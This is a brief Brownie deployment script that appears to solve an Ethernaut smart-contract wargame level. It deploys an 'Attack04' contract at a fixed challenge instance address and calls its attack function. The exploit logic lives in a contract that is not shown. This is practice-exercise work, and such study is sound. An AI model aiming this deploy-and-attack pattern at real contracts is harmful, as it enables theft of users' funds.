from scripts.helpful_scripts import get_account
from brownie import interface, Attack04

ETHERNAUT_INSTANCE = "0x99Cd0201D179781858F2a340C85Bd36b2A5CfFAe"


def main():

    player = get_account()

    attacker_contract = Attack04.deploy(ETHERNAUT_INSTANCE, {"from": player})
    print(f"attack contract deployed: {attacker_contract}")

    attacker_contract.attack({"from": player})
    print(f"attack undertaken :-)")
